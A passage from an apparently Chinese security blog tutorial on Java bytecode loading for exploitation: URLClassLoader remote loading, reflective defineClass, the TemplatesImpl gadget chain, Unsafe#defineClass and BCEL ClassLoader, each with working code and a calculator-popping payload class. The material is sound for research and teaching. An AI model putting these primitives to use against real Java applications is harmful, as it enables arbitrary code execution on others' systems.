style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
</li>
<li>
<p>URL以斜杠/结尾，且协议名是 <code>file</code> ，则使用 <code>FileLoader</code> 来寻找类，即为在本地文件系统中寻找<code>.class</code>文件。</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">import java.net.MalformedURLException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.net.URL;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.net.URLClassLoader;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class loadClassFile {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, IllegalAccessException, InstantiationException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(&quot;file:/Users/d4m1ts/d4m1ts/java/classloader/&quot;)});</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 会加载 /Users/d4m1ts/d4m1ts/java/classloader/Exp.class</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Class&lt;?&gt; exp = urlClassLoader.loadClass(&quot;Exp&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 触发构造函数，弹计算器</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        exp.newInstance();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
</li>
<li>
<p><strong>URL以斜杠/结尾，且协议名不是 <code>file</code> ，则使用最基础的 <code>Loader</code> 来寻找类<code>.class</code>文件。</strong></p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">import java.net.MalformedURLException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.net.URL;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.net.URLClassLoader;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class loadClassFile {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, IllegalAccessException, InstantiationException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(&quot;http://127.0.0.1:8000/&quot;)});</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 会加载 http://127.0.0.1:8000/Exp.class</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Class&lt;?&gt; exp = urlClassLoader.loadClass(&quot;Exp&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 触发构造函数，弹计算器</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        exp.newInstance();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
</li>
</ol>
<p>主要关注第三点，利用基础的<code>Loader</code>类来寻找类，而要利用这一点必须是非<code>file</code>协议的情况下</p>
<p>除<code>file</code>协议外，JAVA默认提供了对<code>ftp,gopher,http,https,jar,mailto,netdoc</code>协议的支持</p>
<p>因此作为攻击者，只要我们能够控制目标<code>Java URLClassLoader</code>的基础路径为一个http服务器，则可以利用远程加载的方式执行任意代码了。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="利用classloaderdefineclass加载字节码">利用ClassLoader#defineClass加载字节码<a href="#利用classloaderdefineclass加载字节码" class="hash-link" aria-label="利用ClassLoader#defineClass加载字节码的直接链接" title="利用ClassLoader#defineClass加载字节码的直接链接">​</a></h2>
<p>其实java不管是加载远程的class文件，还是本地的class或者jar文件，都是要经历下面三个方法调用的：</p>
<ol>
<li><code>loadClass</code>: 从已加载的类缓存、父加载器等位置寻找类（双亲委派机制），在前面没有找到的情况下，执行 <code>findClass</code>。</li>
<li><code>findClass</code>: 根据基础URL指定的方式来加载类的字节码，就像上一节中说到的，可能会在本地文件系统、jar包或远程http服务器上读取字节码，然后交给 <code>defineClass</code>。</li>
<li><code>defineClass</code>: 处理前面传入的字节码，将其处理成真正的Java类。</li>
</ol>
<p>着重关注第三个方法<code>defindClass</code>，由于<code>ClassLoader#defineClass</code>方法是<code>protected</code>所以我们无法直接从外部进行调用，所以我们这里需要借助反射来调用这个方法。</p>
<blockquote>
<p>由于<code>ClassLoader#defineClass</code>方法是<code>protected</code>所以我们无法直接从外部进行调用，所以我们这里需要借助反射来调用这个方法</p>
</blockquote>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">import java.io.IOException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.lang.reflect.InvocationTargetException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.lang.reflect.Method;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.nio.file.Files;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.nio.file.Paths;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class loadClassFile {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main(String[] args) throws IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        byte[] classBytes = Files.readAllBytes(Paths.get(&quot;/Users/d4m1ts/d4m1ts/java/classloader/Exp.class&quot;));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 通过反射调用 defineClass</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Class&lt;ClassLoader&gt; clazz = ClassLoader.class;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Method defineClass = clazz.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        defineClass.setAccessible(true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Class exp = (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), &quot;Exp&quot;, classBytes, 0, classBytes.length);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 需要手动实例化触发构造函数</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        exp.newInstance();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211027142250070" src="/assets/images/image-20211027142250070-c7693c4b79322a9fe3184f20bbcead06.png" width="2784" height="978" class="img_ev3q"></p>
<p>需要注意的是，<code>ClassLoader#defineClass</code>返回的类并不会初始化，只有这个对象显式地调用其构造函数初始化代码才能被执行，所以我们需要想办法调用返回的类的构造函数才能执行命令。</p>
<p>在实际场景中，因为<code>defineClass</code>方法作用域是不开放的，所以攻击者很少能直接利用到它，但它却是我们常用的一个攻击链 <code>TemplatesImpl</code> 的基石。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="利用templatesimpl加载字节码">利用TemplatesImpl加载字节码<a href="#利用templatesimpl加载字节码" class="hash-link" aria-label="利用TemplatesImpl加载字节码的直接链接" title="利用TemplatesImpl加载字节码的直接链接">​</a></h2>
<p>在多个Java反序列化利用链，以及fastjson、jackson的漏洞中，都曾出现过 <code>TemplatesImpl</code> 的身影。虽然大部分上层开发者不会直接使用到<code>defineClass</code>方法，同时<code>java.lang.ClassLoader</code>的<code>defineClass</code>方法作用域是不开放的（<code>protected</code>），很难利用，但是Java底层还是有一些类用到了它，譬如<code>TemplatesImpl</code></p>
<p>在<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>类中定义了一个内部类：<code>TransletClassLoader</code></p>
<p><img decoding="async" loading="lazy" alt="image-20211027142849878" src="/assets/images/image-20211027142849878-afbadf519a7db5261f618c274be9b104.png" width="1586" height="710" class="img_ev3q"></p>
<p>可以看到这个类继承了<code>ClassLoader</code>，而且重写了<code>defineClass</code>方法，并且没有显式地定义方法的作用域。</p>
<blockquote>
<p>Java中默认情况下，如果一个方法没有显式声明作用域，其作用域为<code>default</code>。也就是说<strong>这里的<code>defineClass</code>由其父类的<code>protected</code>类型变成了一个<code>default</code>类型的方法，可以被同一个包下的类调用</strong>。</p>
</blockquote>
<p>由于<code>TransletClassLoader</code>是<code>default</code>的可以被同一个包下的类调用，所以由下向上寻找这个<code>defineClass()</code>在<code>TemplatesImpl</code>中的调用链</p>
<p>一直<code>Find Usages</code>，最终找到调用链如下：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">TemplatesImpl#getOutputProperties()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	TemplatesImpl#newTransformer()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		TemplatesImpl#getTransletInstance()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">			TemplatesImpl#defineTransletClasses()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">				TransletClassLoader#defineClass(final byte[] b)</span><br></span></code></pre></div></div>
<p>最外层的2个方法均是<code>public</code>修饰的，可以被外部调用，以<code>TemplatesImpl#getOutputProperties()</code>为例。</p>
<ul>
<li>
<p>初次观察整个链，需要设置的参数如下<code>_bytecodes（字节码，不能为null）</code>、<code>_name（不能为null）</code>、<code>_class（需要为null，而默认情况下也为null，所以可以不需要）</code></p>
</li>
<li>
<p>但是这样会抛出异常<code>NullPointerException</code>，经过分析，发现还需要设置<code>_tfactory</code>参数，它的类型为<code>TransformerFactoryImpl</code></p>
</li>
</ul>
<p>所以一共需要设置3个参数，分别是<code>_bytecodes</code>、<code>_name</code>、<code>_tfactory</code></p>
<p>通过下方实例化的代码，可以看出远程加载的类还必须继承<code>AbstractTranslet</code>类</p>
<p><img decoding="async" loading="lazy" alt="image-20211027155836709" src="/assets/images/image-20211027155836709-8992383b873df787d6357316bb6608e0.png" width="2092" height="1264" class="img_ev3q"></p>
<ul>
<li>所以我们的恶意类代码修改如下：</li>
</ul>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.io.IOException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class Exp2 extends AbstractTranslet {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public Exp2() throws IOException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Runtime.getRuntime().exec(new String[]{&quot;open&quot;, &quot;-na&quot;, &quot;Calculator&quot;});</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    @Override</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    @Override</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ul>
<li>加载字节码代码</li>
</ul>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.xml.transform.TransformerConfigurationException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.io.IOException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.lang.reflect.Field;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.nio.file.Files;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.nio.file.Paths;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class loadClassFile {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main(String[] args) throws IOException, IllegalAccessException, NoSuchFieldException, TransformerConfigurationException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        byte[] classBytes = Files.readAllBytes(Paths.get(&quot;/Users/d4m1ts/d4m1ts/java/classloader/Exp2.class&quot;));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        TemplatesImpl templates = new TemplatesImpl();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Class clazz = templates.getClass();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Field bytecodes = clazz.getDeclaredField(&quot;_bytecodes&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Field name = clazz.getDeclaredField(&quot;_name&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Field _tfactory = clazz.getDeclaredField(&quot;_tfactory&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        bytecodes.setAccessible(true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        name.setAccessible(true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        _tfactory.setAccessible(true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        bytecodes.set(templates, new byte[][]{classBytes});</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        name.set(templates, &quot;d4m1ts&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        _tfactory.set(templates, new TransformerFactoryImpl());</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        templates.newTransformer();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211027160032003" src="/assets/images/image-20211027160032003-c94456b3fc9e39bf53c927bb423f7edc.png" width="3582" height="2178" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="利用unsafedefineclass加载字节码">利用Unsafe#defineClass加载字节码<a href="#利用unsafedefineclass加载字节码" class="hash-link" aria-label="利用Unsafe#defineClass加载字节码的直接链接" title="利用Unsafe#defineClass加载字节码的直接链接">​</a></h2>
<p><code>Unsafe</code>是位于<code>sun.misc</code>包下的一个类，主要提供一些用于执行低级别、不安全操作的方法，如直接访问系统内存资源、自主管理内存资源等，这些方法在提升Java运行效率、增强Java语言底层资源操作能力方面起到了很大的作用。使用该类可以获取到底层的控制权，该类在<code>sun.misc</code>包，默认是<strong>BootstrapClassLoader</strong>加载的。</p>
<p>而它里面也存在一个<code>defineClass</code>方法，且为<code>public</code>可直接调用</p>
<p><img decoding="async" loading="lazy" alt="image-20211027163022076" src="/assets/images/image-20211027163022076-1bc0d4410fdbb9a7a739d77c809d0c2c.png" width="2220" height="1260" class="img_ev3q"></p>
<p>但因为<strong>Unsafe</strong>的构造方法是private类型的，所以无法通过new方式<strong>实例化</strong>获取，只能通过它的<code>getUnsafe()</code>方法获取。 又因为<strong>Unsafe</strong>是直接操作内存的，为了安全起见，Java的开发人员为<strong>Unsafe</strong>的获取设置了限制，所以想要获取它只能通过Java的反射机制来获取。</p>
<p>因为安全问题，不能直接调用</p>
<p><img decoding="async" loading="lazy" alt="image-20211027163816243" src="/assets/images/image-20211027163816243-36ae845dc01bd6027c676da88d057e97.png" width="2512" height="1652" class="img_ev3q"></p>
<p>但前面也说了，我们可以通过反射的方式来调用</p>
<p>通过分析发现，<code>theUnsafe</code>为<code>Unsafe</code>的对象，我们反射拿到这个对象，就可以执行任意方法了</p>
<p>加载字节码代码</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">import sun.misc.Unsafe;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.io.IOException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.lang.reflect.Field;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.lang.reflect.InvocationTargetException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.lang.reflect.Method;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.nio.file.Files;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.nio.file.Paths;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.security.ProtectionDomain;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class loadClassFile {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main(String[] args) throws IOException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException, NoSuchFieldException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        byte[] classBytes = Files.readAllBytes(Paths.get(&quot;/Users/d4m1ts/d4m1ts/java/classloader/Exp.class&quot;));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Class&lt;Unsafe&gt; unsafeClass = Unsafe.class;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Field theUnsafe = unsafeClass.getDeclaredField(&quot;theUnsafe&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        theUnsafe.setAccessible(true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Unsafe unsafe = (Unsafe) theUnsafe.get(null);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Class&lt;?&gt; exp = unsafe.defineClass(&quot;Exp&quot;, classBytes, 0, classBytes.length, ClassLoader.getSystemClassLoader(), null);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        exp.newInstance();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211027164550213" src="/assets/images/image-20211027164550213-a81d95c6a0a2f248e6946a74df90a889.png" width="3158" height="1612" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="利用bcel-classloader加载字节码">利用BCEL ClassLoader加载字节码<a href="#利用bcel-classloader加载字节码" class="hash-link" aria-label="利用BCEL ClassLoader加载字节码的直接链接" title="利用BCEL ClassLoader加载字节码的直接链接">​</a></h2>
<p>BCEL（Byte Code Engineering Library）的全名应该是<code>Apache Commons BCEL</code>，属于Apache Commons项目下的一个子项目。它提供了一系列用于分析、创建、修改Java Class文件的API。但其因为被<code>Apache Xalan</code>所使用，而<code>Apache Xalan</code>又是Java内部对于JAXP的实现，所以BCEL也被包含在了JDK的原生库中，位于<code>com.sun.org.apache.bcel</code></p>
<blockquote>
<p>虽然说它包含在原生库吧，但是在jdk8u251后，<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>就被删除了，如果单独引入了它的依赖，则还有ClassLoader，参考 <a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html" target="_blank" rel="noopener noreferrer">BCEL ClassLoader去哪了</a></p>
<p>依赖：</p>
<div class="language-xml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-xml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">&lt;!-- https://mvnrepository.com/artifact/org.apache.bcel/bcel --&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">dependency</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">groupId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">org.apache.bcel</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">groupId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">artifactId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">bcel</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">artifactId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">version</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">5.2</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">version</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">dependency</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre></div></div>
</blockquote>
<p>在bcel的包中有一个<code>ClassLoader</code>，他重写了Java内置的<code>ClassLoader#loadClass()</code>方法，在<code>loadclass</code>方法中会对类名进行判断，如果类名以<code>$$BCEL$$</code>开始，就会进入<code>createClass</code>方法，</p>
<p><img decoding="async" loading="lazy" alt="image-20211027171201746" src="/assets/images/image-20211027171201746-c1c6e87a4f17582f3364f8516597216f.png" width="2906" height="1356" class="img_ev3q"></p>
<p>然后在<code>createClass</code>方法里面，会调用<code>Utility.decode()</code>来解密，最后生成<code>clazz</code></p>
<p><img decoding="async" loading="lazy" alt="image-20211027171850126" src="/assets/images/image-20211027171850126-4651bce3e850aae16b2c2c184d49ffd9.png" width="1832" height="504" class="img_ev3q"></p>
<p>但如何生成能给它解密的字节码呢？</p>
<p>通过<code>BCEL</code>提供的两个类<code>Repository</code>和<code>Utility</code>来实现：</p>
<ul>
<li><code>Repository</code>：用于将一个<code>Class</code>先转换成原生字节码，当然这里也可以直接使用<code>javac</code>命令来编译 java 文件生成字节码；</li>
<li><code>Utility</code>：用于将原生的字节码转换成BCEL格式的字节码；</li>
</ul>
<p>利用代码</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">JavaClass javaClass = Repository.lookupClass(Exp.class);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">String encode = Utility.encode(javaClass.getBytes(), true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">System.out.println(encode);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">new org.apache.bcel.util.ClassLoader().loadClass(&quot;$$BCEL$$&quot; + encode).newInstance();</span><br></span></code></pre></div></div>
<p>结果</p>
<p><img decoding="async" loading="lazy" alt="image-20211028113432432" src="/assets/images/image-20211028113432432-538f34d348335fd4404f257c2504332a.png" width="3582" height="2182" class="img_ev3q"></p>
<p>看着很简单很容易，但是有很多坑</p>
<p><strong>坑点一：</strong></p>
<p>jdk8u261，<code>Utility.encode</code>中，<code>GZIPOutputStream</code>流不会<code>close</code>，所以内容写不进<code>ByteArrayOutputStream</code>的（给俺整懵了，网上没找到一个说这个问题的，还是得自己调试才行，离谱）</p>
<p><img decoding="async" loading="lazy" alt="image-20211028110637374" src="/assets/images/image-20211028110637374-f6b1c3766f70ef5a824c58f4ce9b4812.png" width="3584" height="2240" class="img_ev3q"></p>
<p>换了个低版本的jdk8u231，就关闭了流可以写入进行加密，俺也不懂为啥高版本删除了，难道是删除<code>ClassLoader</code>的时候一起删除了？。。。</p>
<p><img decoding="async" loading="lazy" alt="image-20211028110900726" src="/assets/images/image-20211028110900726-a63a59e88f5faabe8534663192aa94f1.png" width="1678" height="1318" class="img_ev3q"></p>
<p><strong>坑点二：</strong></p>
<p>换了低版本的JDK，但是出现了新的问题，提示<code>不支持的操作</code></p>
<p><img decoding="async" loading="lazy" alt="image-20211028112355961" src="/assets/images/image-20211028112355961-0a4b88ec36bba9b216c81734e852e69d.png" width="1514" height="430" class="img_ev3q"></p>
<p>跟了一下，发现在<code>ClassLoader#createClass()</code>方法中有问题</p>
<p>其中在调用<code>setBytes()</code>是提示这个方法调用会失败</p>
<p><img decoding="async" loading="lazy" alt="image-20211028112527428" src="/assets/images/image-20211028112527428-140b2d31abc8b1e7ff4566e4a9b2f816.png" width="2602" height="1214" class="img_ev3q"></p>
<p>跟进一下，发现会直接抛出异常。。。</p>
<p><img decoding="async" loading="lazy" alt="image-20211028112603550" src="/assets/images/image-20211028112603550-d7a754cdb977b9cdcc6dc4cea411a54e.png" width="944" height="206" class="img_ev3q"></p>
<p>找了一大圈，没发现有人提到这个问题，后来不经意看到了<code>setBytes</code>的说明，在<code>BCEL 6.0</code>的时候遗弃了。。。</p>
